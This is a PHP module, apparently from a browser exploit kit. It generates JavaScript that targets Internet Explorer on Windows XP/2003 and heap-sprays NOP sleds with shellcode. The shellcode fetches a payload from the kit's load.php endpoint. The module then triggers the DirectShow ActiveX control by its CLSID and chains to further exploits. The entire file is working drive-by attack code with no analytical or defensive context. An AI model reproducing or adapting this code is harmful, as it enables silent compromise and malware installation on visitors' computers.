<?php



if ($UAinfo['browser'] == "MSIE" AND ($UAinfo['platform'] == "XP" OR $UAinfo['platform'] == "2003")){
	$expname = "directshow";
	$exploits[] = "
	function directshow(){
		var shellcode = unescape(\"" . ShellCode::get($config['UrlToFolder'] . "load.php?e=4") . "\");
		var bigblock = unescape(\"%u9090%u9090\");
		var headersize = 20;
		var slackspace = headersize + shellcode.length;
		while (bigblock.length < slackspace) bigblock += bigblock;
		var fillblock = bigblock.substring(0, slackspace);
		var block = bigblock.substring(0, bigblock.length - slackspace);
		while (block.length + slackspace < 0x40000){
			block = block + block + fillblock;
		}
		var memory = new Array();
		for (var i = 0; i < 350; i++) {
			memory[i] = block + shellcode;
		}
		try {
			var obj = document.createElement('object');
			document.body.appendChild(obj);
			obj.width = '1';
			obj.height = '1';
			obj.data = './directshow.php';
			obj.classid = 'clsid:0955AC62-BF2E-4CBA-A2B9-A63F772D46CF';
			setTimeout(\"" . ($config['AjaxCheckBeforeExploit'] ? "if (CheckIP()){ Complete(); } else { %NextExploit% }" : "%NextExploit%") . "\", 1000);
		} catch (e) {
			%NextExploit%
		}
	}
	";
}


?>